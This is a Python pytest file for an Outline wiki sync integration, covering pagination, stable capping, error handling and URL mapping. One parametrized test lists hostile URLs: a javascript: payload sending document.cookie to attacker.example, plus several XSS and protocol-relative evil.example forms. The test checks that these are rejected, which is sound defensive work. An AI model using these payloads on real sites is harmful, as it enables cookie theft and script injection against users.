# allow: no-sut-import - test_reconciliation validates snapshot/fetch logic.
from __future__ import annotations

from hashlib import sha256

import pytest

from local_deep_research.integrations.models import RemoteSnapshotItem
from local_deep_research.integrations.providers.outline.config import (
    OutlineProviderConfig,
)
from local_deep_research.integrations.providers.outline.errors import (
    OutlineProtocolError,
)
from local_deep_research.integrations.providers.outline.reconciliation import (
    fetch_outline_document,
    fetch_outline_snapshot,
)


def _config(**overrides: object) -> OutlineProviderConfig:
    values: dict[str, object] = {
        "base_url": "https://wiki.example.com",
        "api_token": "t",
    }
    values.update(overrides)
    return OutlineProviderConfig(**values)  # type: ignore[arg-type]


class _FakeClient:
    def __init__(
        self,
        pages: list[list[dict[str, object]]],
        documents: dict[str, dict[str, object]],
        collections: dict[str, str] | None = None,
        config: OutlineProviderConfig | None = None,
    ) -> None:
        self._pages = list(pages)
        self._documents = documents
        self._collections = collections or {}
        self.config = config or _config()
        self.list_calls: list[dict[str, object]] = []

    def list_documents(
        self,
        *,
        offset: int = 0,
        limit: int = 100,
        collection_id: str = "",
    ) -> list[dict[str, object]]:
        self.list_calls.append(
            {"offset": offset, "limit": limit, "collection_id": collection_id}
        )
        page_index = offset // max(limit, 1)
        if page_index < len(self._pages):
            return self._pages[page_index]
        return []

    def get_document(self, document_id: str) -> dict[str, object]:
        return self._documents[document_id]

    def get_collection_name(self, collection_id: str) -> str:
        return self._collections.get(collection_id, "")


class _RepeatingClient:
    """A client whose ``documents.list`` always returns a full page."""

    def __init__(self) -> None:
        self.config = _config()
        self.calls = 0

    def list_documents(
        self,
        *,
        offset: int = 0,
        limit: int = 100,
        collection_id: str = "",
    ) -> list[dict[str, object]]:
        self.calls += 1
        return [_doc(f"doc-{offset + i:06d}") for i in range(limit)]

    def get_document(self, document_id: str) -> dict[str, object]:
        raise AssertionError("not used")

    def get_collection_name(self, collection_id: str) -> str:
        return ""


def _doc(
    doc_id: str,
    updated_at: str = "2026-01-02T03:04:05.000Z",
    collection_id: str = "col-1",
) -> dict[str, object]:
    return {
        "id": doc_id,
        "updatedAt": updated_at,
        "collectionId": collection_id,
    }


def test_snapshot_builds_sorted_unique_items() -> None:
    client = _FakeClient(
        pages=[[_doc("b"), _doc("a")]],
        documents={},
    )
    snapshot = fetch_outline_snapshot(client)
    assert tuple(item.external_id for item in snapshot.items) == ("a", "b")
    assert snapshot.expected_count == 2
    assert len(snapshot.signature) == 64


def test_snapshot_revisions_hash_provider_revision() -> None:
    client = _FakeClient(
        pages=[[_doc("a", updated_at="2026-02-02T00:00:00.000Z")]], documents={}
    )
    snapshot = fetch_outline_snapshot(client)
    expected = sha256(
        b"outline-effective-v1\0" + b"2026-02-02T00:00:00.000Z_col-1"
    ).hexdigest()
    assert snapshot.items[0].revision == expected
    assert snapshot.items[0].provider_revision == (
        "2026-02-02T00:00:00.000Z_col-1"
    )


def test_snapshot_paginates_until_short_page() -> None:
    page_one = [_doc(f"doc-{i}") for i in range(100)]
    page_two = [_doc("doc-final")]
    client = _FakeClient(pages=[page_one, page_two], documents={})
    snapshot = fetch_outline_snapshot(client)
    assert snapshot.expected_count == 101
    assert len(client.list_calls) == 2


def test_snapshot_respects_max_documents() -> None:
    """The cap selects the lowest ids, not whatever the server listed first.

    Truncating the server's own order made the retained set depend on a
    listing order that may vary between runs, and items missing from a
    snapshot are marked ``pending_removal``.
    """
    client = _FakeClient(
        pages=[[_doc("c"), _doc("b"), _doc("a")]],
        documents={},
        config=_config(max_documents=2),
    )
    snapshot = fetch_outline_snapshot(client)
    assert tuple(item.external_id for item in snapshot.items) == ("a", "b")


def test_snapshot_max_documents_is_stable_across_server_listing_order() -> None:
    """The retained subset must not depend on the server's listing order.

    Bounding the *fetch* by the cap re-introduces exactly the dependence
    that sorting removes: with ``max_documents=2`` a first page of
    ``[d, c]`` stops paging and keeps ``("c", "d")``, while a reordered
    first page of ``[a, b]`` keeps ``("a", "b")``. Those sets are disjoint,
    so all four items flap in and out of ``pending_removal`` on alternate
    syncs. ``_MAX_PAGINATED_DOCUMENTS`` - not the cap - bounds a runaway
    server.
    """
    # Pages must be full (``_PAGE_SIZE``) for the loop to keep going.
    filler = [_doc(f"z-{i:03d}") for i in range(98)]
    pages = [[_doc("d"), _doc("c"), *filler], [_doc("a"), _doc("b")]]
    reordered = [[_doc("a"), _doc("b"), *filler], [_doc("d"), _doc("c")]]
    forward = _FakeClient(
        pages=pages, documents={}, config=_config(max_documents=2)
    )
    backward = _FakeClient(
        pages=reordered, documents={}, config=_config(max_documents=2)
    )

    forward_ids = tuple(
        item.external_id for item in fetch_outline_snapshot(forward).items
    )
    backward_ids = tuple(
        item.external_id for item in fetch_outline_snapshot(backward).items
    )
    assert forward_ids == backward_ids == ("a", "b")
    # Both orderings paged all the way to the end before truncating.
    assert len(forward.list_calls) == len(backward.list_calls) == 2


def test_snapshot_terminates_on_empty_page() -> None:
    """An empty page ends pagination even at an exact page boundary."""
    page = [_doc(f"doc-{i:03d}") for i in range(100)]
    client = _FakeClient(pages=[page, []], documents={})
    snapshot = fetch_outline_snapshot(client)
    assert snapshot.expected_count == 100
    assert len(client.list_calls) == 2


def test_snapshot_non_terminating_pagination_raises(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A server returning a full page forever must trip the safety valve."""
    import local_deep_research.integrations.providers.outline.reconciliation as recon

    monkeypatch.setattr(recon, "_MAX_PAGINATED_DOCUMENTS", 150)
    client = _RepeatingClient()
    with pytest.raises(
        OutlineProtocolError, match="pagination_not_terminating"
    ):
        fetch_outline_snapshot(client)


def test_snapshot_non_dict_entry_raises() -> None:
    """A non-dict list element must stay inside the error taxonomy."""
    client = _FakeClient(pages=[["not-a-dict"]], documents={})
    with pytest.raises(OutlineProtocolError, match="document_entry_not_object"):
        fetch_outline_snapshot(client)  # type: ignore[arg-type]


@pytest.mark.parametrize(
    "hostile_url",
    [
        "javascript:fetch('https://attacker.example/?c='+document.cookie)",
        "JaVaScRiPt:alert(1)",
        "java\tscript:alert(1)",
        "\x01javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox(1)",
        "//evil.example/x",
        "/\\evil.example/x",
        "\\\\evil.example\\x",
    ],
    ids=[
        "javascript",
        "mixed-case",
        "embedded-tab",
        "leading-control-char",
        "data",
        "vbscript",
        "protocol-relative",
        "backslash-authority-path",
        "backslash-authority",
    ],
)
def test_fetch_outline_document_rejects_non_http_url(
    hostile_url: str,
) -> None:
    """Only a literal ``http(s)://`` prefix may become a source URL.

    ``source_url`` is stored as ``Document.original_url`` and rendered as an
    ``<a href>``; Jinja escapes quotes but not the scheme. The strict
    prefix allowlist also covers the spellings browsers normalise before a
    scheme check would see them - case, embedded control characters,
    leading control characters. Outline additionally accepts an
    instance-relative path, so the protocol-relative forms ``//host`` and
    ``/\\host`` have to be excluded explicitly: they are an authority, not
    a path, and were being concatenated onto the base URL.
    """
    item = RemoteSnapshotItem(
        external_id="doc-1", provider_revision="x", revision="a" * 64
    )
    client = _FakeClient(
        pages=[],
        documents={
            "doc-1": {
                "id": "doc-1",
                "title": "T",
                "text": "body",
                "url": hostile_url,
            }
        },
    )
    assert (
        fetch_outline_document(client, item).url == "outline://document/doc-1"
    )


def test_snapshot_filters_by_configured_collection() -> None:
    client = _FakeClient(pages=[[_doc("a")]], documents={})
    client.config = _config(
        collection_id="c1f9b8e2-1234-5678-9abc-def012345678",
    )
    fetch_outline_snapshot(client)
    assert (
        client.list_calls[0]["collection_id"]
        == "c1f9b8e2-1234-5678-9abc-def012345678"
    )


def test_snapshot_empty_instance_raises() -> None:
    client = _FakeClient(pages=[[]], documents={})
    with pytest.raises(OutlineProtocolError, match="no_documents"):
        fetch_outline_snapshot(client)


def test_fetch_outline_document_maps_fields() -> None:
    item = RemoteSnapshotItem(
        external_id="doc-1",
        provider_revision="x",
        revision="a" * 64,
    )
    client = _FakeClient(
        pages=[],
        documents={
            "doc-1": {
                "id": "doc-1",
                "title": "Runbook",
                "text": "# Runbook\nRestart the service.",
                "url": "/doc/runbook-doc1",
                "collectionId": "col-1",
                "createdAt": "2026-01-01T00:00:00.000Z",
                "updatedAt": "2026-01-02T00:00:00.000Z",
                "tags": [{"name": "ops"}, {"name": " "}, "garbage"],
            }
        },
        collections={"col-1": "Engineering"},
    )
    raw = fetch_outline_document(client, item)
    assert raw.title == "Runbook"
    assert raw.text == "# Runbook\nRestart the service."
    assert raw.url == "https://wiki.example.com/doc/runbook-doc1"
    assert raw.collection_name == "Engineering"
    assert raw.tags == ("ops",)


def test_fetch_outline_document_absolute_url_passthrough() -> None:
    item = RemoteSnapshotItem(
        external_id="doc-1",
        provider_revision="x",
        revision="a" * 64,
    )
    client = _FakeClient(
        pages=[],
        documents={
            "doc-1": {
                "id": "doc-1",
                "title": "T",
                "text": "body",
                "url": "https://elsewhere.example.com/doc/1",
            }
        },
    )
    raw = fetch_outline_document(client, item)
    assert raw.url == "https://elsewhere.example.com/doc/1"


def test_fetch_outline_document_missing_url_falls_back() -> None:
    item = RemoteSnapshotItem(
        external_id="doc-1",
        provider_revision="x",
        revision="a" * 64,
    )
    client = _FakeClient(
        pages=[],
        documents={"doc-1": {"id": "doc-1", "title": "T", "text": "body"}},
    )
    raw = fetch_outline_document(client, item)
    assert raw.url == "outline://document/doc-1"
